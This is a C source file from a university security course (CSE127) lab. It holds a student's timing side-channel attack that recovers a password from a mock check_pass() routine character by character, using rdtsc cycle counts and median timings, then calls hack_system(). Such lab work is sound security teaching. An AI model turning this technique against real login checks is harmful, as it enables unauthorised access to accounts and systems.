/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include "sysapp.h"
#include <stdlib.h>

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int cmpfunc(const void *a, const void *b){
     return ( *(long*)a - *(long*)b);
}

int main(int argc, char **argv) {
    char guess[33];

    // set guess to zeros
    bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
  int times = 0;
  while(times < 20) {
    bzero(guess, sizeof(guess));
    for(int i = 0; i < 33; i++) {
    	long medArr[94];
	for(int ascii = 33; ascii < 127; ascii++) {
	   guess[i] = ascii;
	   long arr[1000];
	   for(int z = 0; z < 5; z++){
		check_pass(guess);
	   }
	   for(int j = 0; j < 1000; j++) {
	       long start = rdtsc();
	       check_pass(guess);
	       long end = rdtsc();
	       arr[j] = end - start;
	   }
	   qsort(arr, 1000, sizeof(long), cmpfunc);
	   long median = (arr[499]+arr[500])/2;
	   medArr[ascii-33] = median;
//           printf("%c:  median: %d          ",ascii, median);
	}
	long max = 0;
	int charVal;
	for(int x = 0; x < 94; x++) {
	   if(max < medArr[x]){
	   	max = medArr[x];
		charVal = x+33;
	   }
	}
	guess[i] = charVal;
	if(check_pass(guess)) {
	 // printf("PASSWORD IS CORRECT\n");
	  break;
	}
	/*else{
          printf("wrong: %s \n", guess); 
	}*/
    }
    times += 1;
    if(check_pass(guess)) {
  //    printf("RIGHT!!\n");
      break;
    }
  }	
    if (check_pass(guess)) {
        hack_system(guess);
    }
    else {
        printf("Could not get the password!  Last guess was %s\n", guess);
    }
    return 1;
};
